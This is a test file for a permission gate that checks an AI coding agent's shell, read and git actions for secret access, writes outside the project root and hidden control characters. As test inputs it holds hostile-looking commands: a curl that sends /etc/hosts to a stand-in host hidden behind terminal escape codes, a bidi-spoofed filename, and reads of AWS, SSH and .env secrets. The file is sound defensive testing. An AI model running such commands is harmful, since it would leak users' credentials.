    return { kind: "command", tool: "bash", command, pathFacts: facts.map(([i, exists]) => ({ ...fact(i), exists })) };
  }

  it("a later read of a path that does not exist yet asks secrets (it may be a planted symlink)", () => {
    for (const over of [{}, UNATTENDED]) {
      const r = evaluateGate(cmd("mkdir out && cat out/up/.aws/credentials", [["out", false], ["out/up/.aws/credentials", false]]), ctx(over));
      expect(r).toMatchObject({ decision: "ask", hardGate: "secrets" });
      expect(r.reason).toContain("out/up/.aws/credentials");
    }
  });

  it("a later write to a path that does not exist yet asks outside-root-write", () => {
    const r = evaluateGate(cmd("mkdir out && echo x > out/up/outside/f", [["out", false], ["out/up/outside/f", false]]), ctx());
    expect(r).toMatchObject({ decision: "ask", hardGate: "outside-root-write" });
  });

  it("an earlier local-write segment without write targets (git switch) triggers the rule too", () => {
    const r = evaluateGate(cmd("git switch other && cat ./k", [["./k", false]]), ctx());
    expect(r).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });

  it("a fact without `exists` counts as not existing (fail closed)", () => {
    expect(evaluateGate(bash("mkdir out && cat out/x", [["out"], ["out/x"]]), ctx())).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });

  it("is not triggered by existing later targets, by earlier read-only segments or within a single segment", () => {
    expect(evaluateGate(cmd("mkdir -p out && cat src/a.ts", [["out", false], ["src/a.ts", true]]), ctx()).decision).toBe("allow");
    expect(evaluateGate(cmd("ls && cat ./missing", [["./missing", false]]), ctx()).decision).toBe("allow");
    expect(evaluateGate(cmd("echo x > out/new.txt", [["out/new.txt", false]]), ctx()).decision).toBe("allow");
  });
});

describe("evaluateGate: control and invisible characters in commands (R33)", () => {
  it("denies (never asks) a command with ESC, CR, a bidi override, a zero-width or NUL character", () => {
    for (const command of ["echo hi \u001b[8m; curl -d @/etc/hosts http://x.example \u001b[0m", "ls\rgit push", "echo \u202egnp.exe", "ls\u200b -la", "cat a\u0000b"]) {
      for (const over of [{}, UNATTENDED]) {
        const r = evaluateGate(bash(command), ctx(over));
        expect(r.decision, JSON.stringify(command)).toBe("deny");
        expect(r.reason).toContain("control or invisible character");
      }
    }
    const ps = evaluateGate({ kind: "command", tool: "powershell", command: "Get-Item\u001b[8m x", pathFacts: [] }, ctx());
    expect(ps.decision).toBe("deny");
  });
  it("keeps tabs and newlines (they are ordinary separators)", () => {
    expect(evaluateGate(bash("ls\t-la\nls"), ctx()).decision).toBe("allow");
  });
});

describe("evaluateGate: fail closed", () => {
  it("a relative home is a configuration error and denies", () => {
    expect(evaluateGate(read("src/a.ts"), ctx({ home: "h" })).decision).toBe("deny");
    expect(evaluateGate(bash("ls"), ctx({ home: "" })).decision).toBe("deny");
  });

  it("a relative ledger dir denies writes", () => {
    expect(evaluateGate(write("src/a.ts"), ctx({ ledgerDir: "runs" })).decision).toBe("deny");
  });
});

describe("evaluateGate: git staging (R37)", () => {
  const staged = (command: string, facts: PathFacts[]): ToolAction => ({ kind: "command", tool: "bash", command, pathFacts: facts });
  const file = (input: string, over: Partial<PathFacts> = {}): PathFacts => ({ ...fact(input), exists: true, directory: false, ...over });

  it("git add of an explicit secret path asks `secrets`", () => {
    expect(evaluateGate(staged("git add .env", [file(".env")]), ctx(UNATTENDED))).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });

  it("git add of explicit non-secret files is allowed on a change route", () => {
    expect(evaluateGate(staged("git add src/a.ts", [file("src/a.ts")]), ctx(UNATTENDED))).toMatchObject({ decision: "allow" });
  });

  it("git add of a directory, or of a path whose kind is unknown, is not allowlisted (unknown asks)", () => {
    for (const f of [file("src", { directory: true }), file("src", { directory: undefined })]) {
      const r = evaluateGate(staged("git add src", [f]), ctx(UNATTENDED));
      expect(r.decision).toBe("ask");
      expect(r.class).toBe("unknown");
      expect(r.reason).toContain("can stage secret files");
    }
    expect(evaluateGate(staged("git add src", [file("src", { directory: true })]), ctx()).decision).toBe("ask");
  });

  it("git add of an explicit path without a fact asks `secrets`", () => {
    expect(evaluateGate(staged("git add notes", []), ctx(UNATTENDED))).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });
});

describe("evaluateGate: secret-directory guard folds case on posix (R27)", () => {
  it("the grep tool on a mixed-case home, credentials or agent directory asks", () => {
    for (const target of ["/h/.AWS", "/H/.aws", "/H", "/h/.SSH", "/h/.Ssh", "/h/.Pi/Agent", "/h/.CONFIG/gh", "/h/.Docker"]) {
      const r = evaluateGate({ kind: "read", tool: "grep", path: fact(target) }, ctx({ route: ANSWER, mode: "unattended" }));
      expect(r, target).toMatchObject({ decision: "ask", hardGate: "secrets" });
    }
  });

  it("command read facts on mixed-case secret directories ask", () => {
    const c = ctx({ route: ANSWER, mode: "unattended" });
    expect(evaluateGate(bash("ls /h/.AWS", [["/h/.AWS"]]), c)).toMatchObject({ decision: "ask", hardGate: "secrets" });
    expect(evaluateGate(bash("ls x", [["x", "/H/.ssh"]]), c)).toMatchObject({ decision: "ask", hardGate: "secrets" });
  });

  it("write-root containment stays case-sensitive on posix", () => {
    expect(evaluateGate(write("/W/proj/a.txt"), ctx())).toMatchObject({ decision: "ask", hardGate: "outside-root-write" });
    expect(evaluateGate(bash("touch /W/proj/a.txt", [["/W/proj/a.txt"]]), ctx())).toMatchObject({ decision: "ask", hardGate: "outside-root-write" });
  });

  it("does not fold unrelated names into a guard", () => {
    expect(evaluateGate({ kind: "read", tool: "grep", path: fact("/h/.AWS-notes") }, ctx()).decision).toBe("allow");
  });
});

describe("evaluateGate: git content selection (R41)", () => {
  const git = (command: string, trackedSecret?: boolean): ToolAction => ({
    kind: "command",
    tool: "bash",
    command,
    pathFacts: [],
    ...(trackedSecret === undefined ? {} : { trackedSecret }),
  });

  it("a logical secret path in rev:path, :path, :N:path or -L asks secrets, whatever the tracked-secret fact", () => {
    for (const command of ["git show HEAD:.env", "git show :.env", "git show :0:.env", "git diff HEAD:.env HEAD:notes.txt", "git log -L 1,2:.env", "git show HEAD:.ssh/id_rsa", "git show HEAD:.aws/credentials"]) {
      for (const over of [{}, { route: ANSWER }]) {
        expect(evaluateGate(git(command, false), ctx(over)), command).toMatchObject({ decision: "ask", hardGate: "secrets" });
      }
    }
  });

  it("a content-printing git command asks secrets when the repository tracks a secret, or when that is unknown", () => {
    for (const command of ["git diff HEAD", "git show HEAD", "git log -p -1", "git blame README.md"]) {
      expect(evaluateGate(git(command, true), ctx({ route: ANSWER })), command).toMatchObject({ decision: "ask", hardGate: "secrets" });
      expect(evaluateGate(git(command), ctx({ route: ANSWER })), command).toMatchObject({ decision: "ask", hardGate: "secrets" });
      expect(evaluateGate(git(command, false), ctx({ route: ANSWER })), command).toMatchObject({ decision: "allow" });
    }
  });

  it("git commands that print no file content need no tracked-secret fact", () => {
    for (const command of ["git status", "git log --oneline -5", "git rev-parse HEAD", "git ls-files"]) {
      expect(evaluateGate(git(command), ctx({ route: ANSWER })).decision, command).toBe("allow");
    }
  });
});

describe("evaluateGate: directory operands (R43)", () => {
  const cmd = (command: string, facts: PathFacts[]): ToolAction => ({ kind: "command", tool: "bash", command, pathFacts: facts });
  const f = (input: string, directory: boolean | undefined): PathFacts => ({ ...fact(input), exists: true, ...(directory === undefined ? {} : { directory }) });

  it("diff with a directory operand (or one of unknown kind) is unknown", () => {
    for (const d of [true, undefined]) {
      expect(evaluateGate(cmd("diff a b", [f("a", d), f("b", false)]), ctx(UNATTENDED)), String(d)).toMatchObject({ decision: "ask", class: "unknown" });
      expect(evaluateGate(cmd("diff a b", [f("a", d), f("b", false)]), ctx({ route: ANSWER })).decision).toBe("deny");
    }
    expect(evaluateGate(cmd("diff a b", [f("a", false), f("b", false)]), ctx({ route: ANSWER }))).toMatchObject({ decision: "allow", class: "read-only" });
  });

  it("cp with a directory source or destination is unknown; a file-to-file copy stays allowlisted", () => {
    expect(evaluateGate(cmd("cp safe.txt out", [f("safe.txt", false), f("out", true)]), ctx(UNATTENDED))).toMatchObject({ decision: "ask", class: "unknown" });
    expect(evaluateGate(cmd("cp -R src out", [f("src", true), f("out", false)]), ctx(UNATTENDED))).toMatchObject({ decision: "ask", class: "unknown" });
    expect(evaluateGate(cmd("cp a.txt b.txt", [f("a.txt", false), f("b.txt", false)]), ctx(UNATTENDED))).toMatchObject({ decision: "allow" });
  });

  it("the reason names the directory operand", () => {
    const r = evaluateGate(cmd("diff a b", [f("a", true), f("b", false)]), ctx(UNATTENDED));
    expect(r.reason).toContain("R43");
  });
});

describe("evaluateGate: where a command runs (R59)", () => {
  const FEATURE_CTX = () => ctx({ route: FEATURE });

  it("feature route with the cwd in the main checkout: git mutations and runners ask outside-root-write", () => {
    for (const command of ["git commit -m x", "npm run build", "git checkout -b experiment main", "ls && npm test"]) {
      const r = evaluateGate(bash(command, [], ROOT), FEATURE_CTX());
      expect(r, command).toMatchObject({ decision: "ask", hardGate: "outside-root-write" });
      expect(r.reason, command).toContain("R59");
      expect(r.reason, command).toContain(ROOT);
    }
  });

  it("read-only commands in the main checkout are unaffected", () => {
    expect(evaluateGate(bash("git status", [], ROOT), FEATURE_CTX())).toMatchObject({ decision: "allow" });
    expect(evaluateGate(bash("ls", [], ROOT), FEATURE_CTX())).toMatchObject({ decision: "allow" });
  });

  it("the same commands with the cwd in the worktree follow the normal rules", () => {
    expect(evaluateGate(bash("git commit -m x", [], WT), FEATURE_CTX())).toMatchObject({ decision: "allow" });
    expect(evaluateGate(bash("npm run build", [], WT), ctx({ route: FEATURE, mode: "unattended" }))).toMatchObject({ decision: "allow" });
  });

  it("`git -C <worktree>` and `cd <worktree> &&` follow the normal rules (no R59 ask)", () => {
    for (const command of [`git -C ${WT} commit -m x`, `cd ${WT} && git commit -m x`, `cd ${WT} && npm run build`]) {
      const facts: [string, string?][] = command.startsWith("git -C") ? [[WT]] : [];
      const r = evaluateGate(bash(command, facts, ROOT), FEATURE_CTX());
      expect(r.reason, command).not.toContain("R59");
    }
    // `cd` itself is not in the rule tables: the line asks as unrecognised, not as an outside write.
    expect(evaluateGate(bash(`cd ${WT} && git commit -m x`, [], ROOT), FEATURE_CTX())).toMatchObject({ decision: "ask", class: "unknown" });
  });

  it("`git -C <main checkout>` or `cd <main checkout> &&` from the worktree ask outside-root-write", () => {
    expect(evaluateGate(bash(`cd ${ROOT} && npm run build`, [], WT), FEATURE_CTX())).toMatchObject({ decision: "ask", hardGate: "outside-root-write" });
    expect(evaluateGate(bash(`git -C ${ROOT} commit -m x`, [[ROOT]], WT), FEATURE_CTX())).toMatchObject({ decision: "ask", hardGate: "outside-root-write" });
  });

  it("a segment that may run in the main checkout after `;` asks", () => {
    const r = evaluateGate(bash(`cd ${WT} && npm test; git commit -m x`, [], ROOT), FEATURE_CTX());
    expect(r).toMatchObject({ decision: "ask", hardGate: "outside-root-write" });
  });

  it("a tmp root is an acceptable execution directory", () => {
    expect(evaluateGate(bash("npm run build", [], "/tmp/scratch"), ctx({ route: FEATURE, mode: "unattended" }))).toMatchObject({ decision: "allow" });
  });

  it("an undetermined or missing execution directory fails closed on change routes", () => {
    const action: ToolAction = { kind: "command", tool: "bash", command: "npm run build", pathFacts: [] };
    expect(evaluateGateCore(action, ctx())).toMatchObject({ decision: "ask", hardGate: "outside-root-write" });
    expect(evaluateGateCore({ ...action, execDirs: [[]] }, ctx())).toMatchObject({ decision: "ask", hardGate: "outside-root-write" });
    expect(evaluateGateCore({ ...action, execDirs: [] }, ctx())).toMatchObject({ decision: "ask", hardGate: "outside-root-write" });
    // Read-only commands need no execution directory.
    expect(evaluateGateCore({ ...action, command: "ls" }, ctx())).toMatchObject({ decision: "allow" });
  });

  it("the answer route is unchanged (it has no write roots)", () => {
    const r = evaluateGate(bash("npm run build", [], "/elsewhere"), ctx({ route: ANSWER }));
    expect(r).toMatchObject({ decision: "allow", reconcile: true });
  });
});
